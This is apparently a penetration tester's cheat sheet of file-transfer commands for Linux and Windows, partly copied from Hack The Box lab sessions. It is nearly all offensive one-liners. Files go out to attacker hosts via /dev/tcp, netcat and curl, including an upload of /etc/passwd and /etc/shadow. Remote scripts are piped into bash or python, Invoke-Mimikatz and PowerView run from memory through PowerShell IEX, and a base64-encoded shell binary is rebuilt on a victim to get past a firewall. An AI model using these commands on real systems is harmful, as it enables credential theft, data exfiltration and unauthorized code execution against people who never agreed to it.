

Linux :
```bash
# Upload
bash -c 'cat /path/to/file > /dev/tcp/ATTACKER_IP/PORT'

# Download
bash -c 'cat < /dev/tcp/ATTACKER_IP/PORT > file_saved'


# Upload
nc ATTACKER_IP PORT < /path/to/file

# Download
nc ATTACKER_IP PORT > file_saved

# Listen to receive
nc -lnvp PORT > received_file

# Listen to send
nc -lnvp PORT < /path/to/file



# Start HTTP server (Python 3)
python3 -m http.server 2121

# Start HTTP server (Python 2)
python -m SimpleHTTPServer 2121

# Download with wget
wget http://ATTACKER_IP:2121/filename

# Download with curl
curl http://ATTACKER_IP:2121/filename -o file_saved


# Upload
scp -P 2121 /path/to/file user@ATTACKER_IP:/destination/

# Download
scp -P 2121 user@ATTACKER_IP:/path/to/file file_saved


ftp ATTACKER_IP
put /path/to/file
get filename

# Upload
tftp ATTACKER_IP
put /path/to/file

# Download
tftp ATTACKER_IP
get filename


curl -X POST --data-binary @/path/to/file http://ATTACKER_IP:PORT/upload

#firewall bypass
base64 shell -w 0 #convert any binary file to base64 decode to victum
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

file shell

#check the integrity of the file in both the machine.
md5sum shell


Web Downloads with Wget and cURL
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
somx@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh


Fileless Download with cURL and wget:
somx@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
somx@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

#Download with Bash (/dev/tcp)
somx@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
somx@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
somx@htb[/htb]$ cat <&3


Pwnbox - Start Web Server
somx@htb[/htb]$ sudo python3 -m pip install --user uploadserver
somx@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
somx@htb[/htb]$ mkdir https && cd https
somx@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
somx@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

```


Windows :
```bash
certutil -urlcache -f http://192.168.31.141/ignite.txt ignite.txt
bitsadmin /transfer job http://192.168.31.141/ignite.txt C:\Users\Public\ignite.txt

#Download file 
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')

#Upload file
powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')"

#copy files
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -username admin -password admin
net use \\192.168.154.138\share /user:admin admin 
		copy \\192.168.31.141\share\ignite.txt
		 copy ignite.txt \\192.168.31.141\share\ignite.txt



using tftp:
use auxiliary/server/tftp
set srvhost 192.168.31.141
set tftproot /root/raj
run
			tftp -i 192.168.31.219 GET ignite.txt


use auxiliary/server/ftp
set srvhost 192.168.31.141
set ftproot /root/raj
set ftpuser raj
set ftppass 123
run
				ftp 192.168.31.141
				dir
				get ignite.txt


python3 -m pyftpdlib -w -p 21 -u ignite -P 123
				ftp 192.168.31.141
				get ignite.txt
				put C:\Users\raj\avni.txt

iwr -uri http://<ip_address>/file.exe -outfile sh.exe

-----------------------------------------------------------------------------------------------
md5sum id_rsa
cat id_rsa |base64 -w 0;echo

PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hTVPZWhLQo="))
-----------------------------------------------------------------------------------------------

#file download from internet
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

#Directly run from memory
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

#using invoke-webrequest
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

#Installing the FTP Server Python3 Module - pyftpdlib
sudo pip3 install pyftpdlib

#Setting up a Python3 FTP Server
sudo python3 -m pyftpdlib --port 21
sudo python3 -m pyftpdlib --port 21 --write

#Transferring Files from an FTP Server Using PowerShell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')



#Encode File Using PowerShell:
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
somx@htb[/htb]$ echo IyBDb3B5cmByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20ICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts

#Powershell web upload :
pip3 install uploadserver
python3 -m uploadserver

PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts


#PowerShell Base64 Web Upload:
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
somx@htb[/htb]$ nc -lvnp 8000
somx@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts




```
